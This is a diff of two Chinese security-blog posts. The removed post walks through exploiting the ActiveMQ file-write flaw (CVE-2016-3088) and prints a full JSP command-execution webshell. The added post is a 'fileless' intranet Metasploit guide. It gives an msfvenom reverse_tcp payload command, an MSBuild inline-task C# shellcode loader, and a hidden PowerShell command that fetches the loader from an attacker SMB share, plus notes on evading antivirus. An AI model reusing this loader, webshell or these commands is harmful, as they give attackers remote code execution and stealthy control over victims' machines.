@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>ActiveMQ任意文件写入漏洞（CVE-2016-3088） | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="ActiveMQ任意文件写入漏洞（CVE-2016-3088） | 九世的博客">
+  <title>内网不落地上线msf | 九世的博客</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="内网不落地上线msf | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1282,25 +1282,19 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-复现ActiveMQ任意文件写入漏洞（CVE-2016-3088）" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-内网不落地上线msf" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">ActiveMQ任意文件写入漏洞（CVE-2016-3088）</h1>
+        <h1 class="article-title">内网不落地上线msf</h1>
     
     <div class="article-meta">
         
         
         
-        
-        <span class="tag">
-            
-            <a href="javascript:" class="color3">Writing</a>
-            
-        </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-07-25 06:43</time>
+        创建时间:<time class="date" title="更新时间: 2020-02-08 16:16:45">2020-02-08 15:42</time>
         
     </div>
     <div class="article-meta">
@@ -1322,7 +1316,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文："><span class="toc-text">正文：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00前言"><span class="toc-text">0x00前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01环境"><span class="toc-text">0x01环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02实验过程"><span class="toc-text">0x02实验过程</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1337,78 +1331,82 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>学习完Rust的Vector，想着复现一下Vulhub里面的漏洞。然后就踩到了一个坑了。= =简直MMP，原本是想着写CVE-2015-5254的复现的。可复现方法不能用了。所以emmmm….<br><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=886494489,586744998&amp;fm=27&amp;gp=0.jpg" alt=""></p>
-<h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p>首先我们要搭建Vulhub的环境：</p>
-<pre><code>Vulhub漏靶场搭建方法：
+        <h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>原本打算直接写在星球里的，编辑器太垃圾了。我佛了….写的烦躁，直接用博客写</p>
+<h2 id="0x01环境"><a href="#0x01环境" class="headerlink" title="0x01环境"></a>0x01环境</h2><pre><code>windows 7:192.168.241.156
+kali:192.168.1.108
+</code></pre><h2 id="0x02实验过程"><a href="#0x02实验过程" class="headerlink" title="0x02实验过程"></a>0x02实验过程</h2><p><strong>msfvenom生成32位的shellcode</strong></p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.108 LPORT=4444 -f csharp
+</code></pre><p>替换xml里的shellcode</p>
+<pre><code class="xml">&lt;Project ToolsVersion=&quot;4.0&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt;
+  &lt;!-- This inline task executes shellcode. --&gt;
+  &lt;!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj --&gt;
+  &lt;!-- Save This File And Execute The Above Command --&gt;
+  &lt;!-- Author: Casey Smith, Twitter: @subTee --&gt;
+  &lt;!-- License: BSD 3-Clause --&gt;
+  &lt;Target Name=&quot;Hello&quot;&gt;
+    &lt;ClassExample /&gt;
+  &lt;/Target&gt;
+  &lt;UsingTask
+    TaskName=&quot;ClassExample&quot;
+    TaskFactory=&quot;CodeTaskFactory&quot;
+    AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;
+    &lt;Task&gt;
 
-vulhub官网：http://vulhub.org/#/docs/download-vulhub/
-1.安装docker，windows自己去官网下。Linux执行：sudo apt-get install docker.io
-2.安装python和pip:sudo apt-get install python和suao apt-get install python-pip
-3.安装docker-compose:pip install docker-compose
-4.下载Vulhub：git clone https://github.com/vulhub/vulhub.git
 
-安装好之后进入对应的漏洞文件执行：docker-compose up -d
-如果出现：Couldn&#39;t connect to Docker daemon at http+xxx的问题有三个解决的方法：
-1.将当前的用户加入dokcer用户组 sudo usermod -aG docker &lt;Username&gt;
-2.在使用docker-compose附加上sudo sudo docker-compose up -d
-3.设置DOCKER_HOST这一个环境变量 export DOCKER_HOST=tcp://loaclhost:4243 设置完成后重新启动docker
-</code></pre><p>漏洞介绍：</p>
-<pre><code>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。
-
-fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：
-
-其使用率并不高
-文件操作容易出现漏洞
-所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。
-</code></pre><p>在测试过程中，可以关注ActiveMQ的版本，避免走弯路。</p>
-<p>这里我的是CVE-2016-3088,所以我们要进入对应的目录：</p>
-<pre><code>cd /vulhub/activemq/CVE-2016-3088 
-</code></pre><p><img src="https://i.imgur.com/VZ5imMu.png" alt=""></p>
-<pre><code>然后执行docker-compose -build 下载漏洞环境
-然后在执行docker-compose up -d 启动
-</code></pre><p>之后我们打开浏览器访问：</p>
-<pre><code>http://127.0.0.1:8161
-</code></pre><p>我们可以看到如下图所示：</p>
-<p><img src="https://i.imgur.com/uoF1A1z.png" alt=""></p>
-<p>这个任意文件写入漏洞得要先知道WEB路径。所以我们得登陆后台<br>默认用户名和密码是：admin/admin，登陆进去后我们要访问</p>
-<pre><code>http://your-ip:8161/admin/test/systemProperties.jsp
-</code></pre><p>查看ActiveMQ的绝对路径</p>
-<p><img src="https://i.imgur.com/LpIcgNx.png" alt=""></p>
-<p>绝对路径为：</p>
-<pre><code>/opt/activemq
-</code></pre><p>知道绝对路径之后，我们要进行文件上传。<br><img src="https://i.imgur.com/MyFt8se.png" alt=""></p>
-<p>注：这里的shell2.txt为shell代码<br>shell代码如下：</p>
-<pre><code>&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt; &lt;% %&gt; 
-&lt;HTML&gt;&lt;BODY&gt; &lt;FORM METHOD=&quot;GET&quot; NAME=&quot;comments&quot; ACTION=&quot;&quot;&gt;
-&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;comment&quot;&gt; 
-&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt; 
-&lt;/FORM&gt; &lt;pre&gt; 
-&lt;%
- if ( request.getParameter( &quot;comment&quot; ) != null )
- {
-     out.println( &quot;Command: &quot; + request.getParameter( &quot;comment&quot; ) + &quot;&lt;BR&gt;&quot; );
-     Process p        = Runtime.getRuntime().exec( request.getParameter( &quot;comment&quot; ) );
-     OutputStream os    = p.getOutputStream();
-     InputStream in        = p.getInputStream();
-     DataInputStream dis    = new DataInputStream( in );
-     String disr        = dis.readLine();
-     while ( disr != null )
-     {
-         out.println( disr ); disr = dis.readLine();
-     }
- }
- %&gt;
- &lt;/pre&gt; 
- &lt;/BODY&gt;&lt;/HTML&gt;
-</code></pre><p>代码来自：<a href="https://github.com/JoyChou93/webshell/blob/master/jsp/cmd.jsp" title="JSP shell" target="_blank" rel="noopener">https://github.com/JoyChou93/webshell/blob/master/jsp/cmd.jsp</a></p>
-<p>上传：<br><img src="https://i.imgur.com/dSa5cgB.png" alt=""></p>
-<p>HTTP状态码为204，即为上传成功</p>
-<p>然后听过MOVE进行改名为jsp<br><img src="https://i.imgur.com/YdINGV6.png" alt=""></p>
-<p>然后我们访问<a href="http://127.0.0.1:8161/api,就可以看到我们上传的shell文件" target="_blank" rel="noopener">http://127.0.0.1:8161/api,就可以看到我们上传的shell文件</a></p>
-<p><img src="https://i.imgur.com/asEAY27.png" alt=""></p>
-<p>执行命令如下：<br><img src="https://i.imgur.com/AI0RAO3.png" alt=""></p>
-<p>ActiveMQ更多漏洞：<a href="http://www.freebuf.com/column/161188.html" title="更多漏洞" target="_blank" rel="noopener">http://www.freebuf.com/column/161188.html</a></p>
-<p>转载请声明：来之422926799.github.io</p>
+      &lt;Code Type=&quot;Class&quot; Language=&quot;cs&quot;&gt;
+      &lt;![CDATA[
+        using System;
+        using System.Runtime.InteropServices;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        public class ClassExample :  Task, ITask
+        {         
+          private static UInt32 MEM_COMMIT = 0x1000;          
+          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
+          [DllImport(&quot;kernel32&quot;)]
+            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
+            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
+          [DllImport(&quot;kernel32&quot;)]
+            private static extern IntPtr CreateThread(            
+            UInt32 lpThreadAttributes,
+            UInt32 dwStackSize,
+            UInt32 lpStartAddress,
+            IntPtr param,
+            UInt32 dwCreationFlags,
+            ref UInt32 lpThreadId           
+            );
+          [DllImport(&quot;kernel32&quot;)]
+            private static extern UInt32 WaitForSingleObject(           
+            IntPtr hHandle,
+            UInt32 dwMilliseconds
+            );          
+          public override bool Execute()
+          {
+            byte[] shellcode = new byte[304]{shellcode };
+              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
+                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
+              IntPtr hThread = IntPtr.Zero;
+              UInt32 threadId = 0;
+              IntPtr pinfo = IntPtr.Zero;
+              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+              WaitForSingleObject(hThread, 0xFFFFFFFF);
+              return true;
+          }
+        }     
+      ]]&gt;
+      &lt;/Code&gt;
+    &lt;/Task&gt;
+  &lt;/UsingTask&gt;&lt;/Project&gt;
+</code></pre>
+<p><img src="https://s2.ax1x.com/2020/02/08/1R2V6P.png" alt="1R2V6P.png"></p>
+<p>配置smb<br><img src="https://s2.ax1x.com/2020/02/08/1R2G60.png" alt="1R2G60.png"></p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1R20h9.png" alt="1R20h9.png"></p>
+<p>执行如下命令：</p>
+<pre><code>powershell -w hidden -c &quot;C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\192.168.1.108\share\t.xml &quot;
+</code></pre><p>这样做是为了不出现黑框，但是会被杀。如果有其他隐藏黑框的可以取而代之<br>（被杀的点是powershell -w hidden参数，命令原本不会被杀，已测过）<br><img src="https://s2.ax1x.com/2020/02/08/1RhpjI.png" alt="1RhpjI.png"></p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RhE4g.png" alt="1RhE4g.png"></p>
+<p>如果是外网的话可用WebDAV代替smb</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1418,12 +1416,12 @@ fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HT
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</p>
+    <p><span class="copy-title">文章标题:</span>内网不落地上线msf</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-07-25, 06:43:17</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/55a9538c.html" title="ActiveMQ任意文件写入漏洞（CVE-2016-3088）">http://422926799.github.io/posts/55a9538c.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-02-08, 15:42:11</p>
+    <p><span class="copy-title">最后更新:</span>2020-02-08, 16:16:45</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/feab0778.html" title="内网不落地上线msf">http://422926799.github.io/posts/feab0778.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
